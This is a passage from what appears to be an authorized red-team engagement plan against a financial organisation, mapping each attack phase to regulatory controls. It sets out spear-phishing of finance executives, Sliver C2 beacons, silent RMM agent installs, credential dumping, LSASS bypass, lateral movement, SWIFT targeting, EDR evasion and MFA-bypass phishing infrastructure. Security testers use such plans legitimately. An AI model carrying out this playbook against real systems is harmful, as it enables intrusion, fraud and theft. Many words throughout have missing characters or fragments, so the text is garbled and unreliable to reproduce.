Deliver phishing email from spoofed or compromised organizational account (bypasses SPF/DKIM). Lure targets CFO/finance executive persona. Payload delivers Sliver beacon alongside silent installation of RMM agent (AteraAgent, NetBird, SimpleHelp). Validate whether EDR detects unauthorized RMM agent enrollment per NYDFS §500.14(b).

### 5.3 Post-Exploitation & Lateral Movement
*(CSF 2.0: Detect/Respond | NIST 800-53: AC-2, AC-6, AU-12, IR-4)*

| Technique | Tool | NIST 800-53 Control Tested |
|---|---|---|
| AD Enumeration | `BloodHound CE` + `SharpHound` (via Sliver `execute-assembly`) | AC-2, AC-6 |
| Credential Dumping | Sliver `sideload mimikatz.dll`; `Nanodump` BOF | IA-5, SC-28 |
| Kerberoasting | `Rubeus` via Sliver `execute-assembly` | IA-5, AC-3 |
| LSASS Bypass | `PPLdump` via Sliver `sideload` | SI-3, SC-39 |
| Lateral Movement | Sliver `psexec`, `wmiexec`, `ssh`; `NetExec` (SMB, WMI, MSSQL) | SC-7, AC-17 |
| Cloud Enumeration | `AADInternals`, `ROADtools` | AC-3, IA-8 |
| Internal Pivot | Sliver `portfwd`; `socks5` proxy; `wg-portfwd` for RDP via WireGuard tunnel | SC-7 |
| SWIFT Targeting | Custom scripts via Sliver tunnel | SC-8, SI-4, AU-10 |
| Payload Evasion | `Donut`, `Scarecrow` wrapping Sliver shellcode | SI-3, SC-39 |
| .NET in-memory | Sliver `execute-assembly /path/to/Seatbelt.exe -group=all` | SI-3, AU-2 |

### 5.4 Crown Jewel Flags

| Objective | CSF 2.0 Function | Threat Scenario |
|---|---|---|
| Domain Admin compromise | Protect / Detect | Ransomware pre-positioning (RansomHub, APT35) |
| Trade OMS access | Protect | Market manipulation / trade spoofing (APT34, APT29) |
| SWIFT endpoint staging | Protect | Fraudulent transfer (Lazarus, APT38) |
| Clearing system credential access | Protect | Settlement disruption (Predatory Sparrow, APT33) |
| PII / trading data exfiltration | Respond | SEC 8-K materiality trigger; NYDFS 72-hr notification test |
| Cloud tenant admin access | Detect | M365/Entra ID full takeover (APT29, Scattered Spider) |
| Unauthorized RMM agent enrollment | Detect | MuddyWater RMM persistence; NYDFS §500.14(b) EDR gap |
| Physical / data center access | Protect | Insider threat / supply chain (Predatory Sparrow) |

---

## Phase 6 — Full Tools & Configuration Reference

| Category | Tool | Configuration Notes |
|---|---|---|
| **C2 Framework** | **Sliver v1.5.42** (BishopFox) | Primary C2; HTTPS/mTLS/WireGuard/DNS; per-binary asymmetric keys; multiplayer operator support; opeource; no licensing cost |
| **C2 Redirectors** | Nginx / Apache on separate VPS | Proxy to Sliver team server; iptables whitelist only redirector IP on team server |
| **CDN / Fronting** | Cloudflare | Front redirectors to avoid JARM fingerprinting and IP-based blocking |
| **Phishing** | Evilginx2 + Gophish | AiTM MFA bypass; lure templates for APT35/APT34/Lazarus/MuddyWater profiles |
| **Payload Wrapping** | Donut, Scarecrow | AMSI/ETW bypass on Sliver shellcode output |
| **AD Reconnaissance** | BloodHound CE + SharpHound | Delivered via Sliver `execute-assembly`; Tier-0 path identification |
| **Credential Ops** | Mimikatz (via Sliver `sideload`), Rubeus, Nanodump BOF | In-memory only; no disk drops |
| **Cloud Ops** | AADInternals, ROADtools | Entra ID / M365 enumeration; OAuth token abuse (APT29 / APT33 profiles) |
| **Lateral Movement** | NetExec, Sliver built-ins | SMB/WMI/MSSQL; pass-the-hash |
| **Vuln Scanning** | Nuclei + financial CVE templates | Citrix, Fortinet, Exchange, ConnectWise, PaperCut, VPN appliances |
| **OSINT** | Maltego, SpiderFoot, theHarvester, FOCA | Passive recon only until written authorization received |
| **RMM Simulation** | AteraAgent, NetBird (controlled install) | MuddyWater scenario only; install in authorized scope; document for NYDFS §500.14(b) gap testing |
| **Reporting** | PlexTrac or Dradis | CVSS v4.0; NIST 800-53 control mapping; MITRE ATT&CK Navigator JSON export |

**Tester Certifications:**

- OSCP (Offensive Security Certified Professional)
- CRTO (Certifie Red Team Operator)
- GXPN (GIAC Exploit Researcher and Advanced Penetration Tester)
- CISSP or CISM (engagement leadership / reporting sign-off)

---

## Phase 7 — Historical Reference Reports (2022–2025)

| Year | Report | Key Relevance |
|---|---|---|
| 2023 | **FS-ISAC "Navigating Cyber 2024"** | Found that 35% of all DDoS attacks in 2023 targeted financial services; flagged new extortion tactics tied to SEC/DORA disclosure deadlines and quantum computing threats to cryptographic agility. |
| 2023 |NISA Threat Landscape: Finance (Jan 2023–Jun 2024)** | Documented North Korean APTs including Lazarus Group in cryptocurrency theft and ransomware; the FBI linked Lazarus to a $41 million theft from Stake.com in September 2023. |
| 2023 | **ION Group / LockBit Incident (Feb 2023)** | LockBit's attack on ION disrupted a cleared derivatives trading platform, affecting multiple banks, brokerages, and hedge funds in the US and EU that could not process transactions. Highest-fidelity public template for tradininfrastructure disruption. |
| 2023 | **Clop / MOVEit Supply Chain (Mar–Jul 2023)** | The Clop ransomware group's exploitation of the MOVEit vulnerability impacted roughly 100 financial companies, establishing the benchmark supply chain scenario for vendor-pivot red team exercises. |
| 2024 | **CISA Advisory AA24-057A — SVR Cloud Tactics** | Documents APT29/Midnight Blizzard cloud-native TTPs including residential proxy use and exploitation of system accounts in identity infrastructure — directly infoenario C (APT29). |
| 2024 | **CISA / FBI / CNMF / NCSC Advisory AA22-055A — MuddyWater** | Joint advisory formally attributing MuddyWater to MOIS; documents full TTP baseline including spear-phishing, RMM tool abuse, and open-source tool integration — foundational reference for Scenario F. |
| 2024 | **Flashpoint Financial Threat Actor Report** | Akira targeted 34 financial organizations; RansomHub claimed 38 financial victims; LockBit claimed access to the US Federal Reserve with alleged exfiltration 3 TB of data; Scattered Spider leveraged SIM swapping extensively. |
| 2024 | **CloudSEK Charming Kitten (APT35) Leak Analysis** | Credible leak of APT35 operational materials documenting coordinated teams for penetration, malware development, and social engineering, including rapid exploitation of CVE-2024-1709 and mass router DNS manipulation targeting financial sectors in the Middle East, US, and Asia. |
| 2024 | **Check Point BugSleep Analysis (Jul 2024)** | Full technical breakdown of MuddyWater's BugSleep backdoor, including sleep API sandbox evasion, mutex creation, encrypted C2 configuration, and Egnyte/file-sharing delivery chain — directly informs MuddyWater Scenario F emulation. |
| 2024 | **Zscaler WINELOADER Analysis (Nov 2024)** | Documented WINELOADER's time-gated C2 communications and memory forensics evasion — the precise behavioral signature this engagement's Sliver long-dwell configuration should emulate in Scenario C (APT29). |
| 2024 | **Deep Instinct DarkBeatC2 Analysis (Apr 2024)** sclosed MuddyWater's DarkBeatC2 framework, including the Registry AutodialDLL sideloading technique and PowerShell-based C2 management — informs Sliver-based DarkBeatC2 emulation. |
| 2025 | **Bybit $1.5B Heist Post-Mortems (Feb 2025)** | Lazarus deceived exchange executives into authorizing transfer of over 400,000 ETH via a counterfeit wallet management interface — definitive template for transaction authorization layer compromise. |
| 2025 | **Predatory Sparrow — Bank Sepah / Nobitex (Jun 2025)** |tory Sparrow claimed to have destroyed Bank Sepah's data causing widespread service outages, and the following day stole $90 million from the Nobitex crypto exchange before destroying the funds — establishes the benchmark for destructive state-level financial exchange targeting. |
| 2025 | **Trellix Iranian Cyber Capability 2026 Report** | Documents APT35's dual-track development of BellaCPP and updated PowerLess backdoor with AMSI/ETW bypass, APT34's dual-channel C2 concealment inside Authorization Bearetokens, and MuddyWater's evolving malware suite (BugSleep, StealthCache, Phoenix, Fooder, MuddyViper, RustyWater) — directly informs Scenarios B, C, and F. |
| 2025 | **Symantec/Carbon Black MuddyWater U.S. Bank Detection (Mar 2025)** | First confirmed MuddyWater activity on a U.S. bank network; overlap with pre-conflict operational security posture suggesting deliberate preparation — highest-relevance historical data point for U.S. exchange MuddyWater scenario justification. |

---

## Phase 8 — Closeporting & Regulatory Deliverables

### 8.1 Purple Team Exercise

After covert red team phase concludes:

- Replay each scenario with SOC observing live
- Validate SIEM / EDR detection coverage against MITRE ATT&CK Navigator heatmap
- Identify detection gaps for Sliver-specific signatures (JARM, mTLS port 8888, WireGuard UDP 51820, characteristic certificate chains)
- Specifically validate RMM agent detection (Atera, SimpleHelp, NetBird) per NYDFS §500.14(b) EDR/SIEM compliance requirements
- Document resuts for regulatory evidence package

### 8.2 Findings Classification

All findings scored using **CVSS v4.0** and mapped to **NIST 800-53 Rev. 5** control families. Classified as Critical / High / Medium / Low. Critical findings are reviewed by legal counsel for SEC 8-K materiality assessment obligations per the four-business-day disclosure rule.

### 8.3 Required Deliverables

**For Board / Executive Leadership** (CSF 2.0 Govern; SEC Form 10-K Item 106):

- Executive Summary: business risk narrative, crown jewel findings, regulatory exposure by APT actor
- NIST CSF 2.0 current vs. target profile heat map
- Prioritized remediation roadmap

**For Technical Teams** (NIST 800-53 CA-8; NYDFS §500.5):

- Full attack path documentation with screenshots, Sliver session logs, and evidence chains per scenario
- All TTPs mapped to MITRE ATT&CK Navigator layer (exportable JSON)
- Sliver-specific detection signatures (JARM fingerprints, mTLS port anomalies, WireGuard UDP/51820 baseline) for SOC integration
- RMM tool abue detection signatures for MuddyWater-profile gaps

**For Compliance / Legal** (NYDFS §500.17; SEC Rule 10; PCI DSS Req. 11.3):

- NYDFS §500.17(b) compliance attestation documentation
- Materiality assessment for any simulated finding against SEC 4-day disclosure standard
- PCI DSS Req. 11.3 pen test completion report (signed by OSCP/GXPN-certified tester)
- CRI Cyber Profile 2.0 control objective coverage mapping

### 8.4 Retention Requirements

All supporting records — including penetration testing rts, access control reviews, and cybersecurity program documentation — must be retained for five years under NYDFS Part 500. Evidence packages should be archived in a tamper-evident, access-controlled repository.

---

> **Legal Notice:** This engagement outline is for authorized security professionals operating under formal contractual and legal agreements with explicit CFAA authorization. All tools, techniques, and scenarios must be used only within the scope of written authorization against systems owneby or explicitly consented to by the target organization. Engagement personnel must coordinate with qualified legal counsel to ensure compliance with the CFAA, applicable state laws, and SEC materiality obligations prior to commencing any active testing.
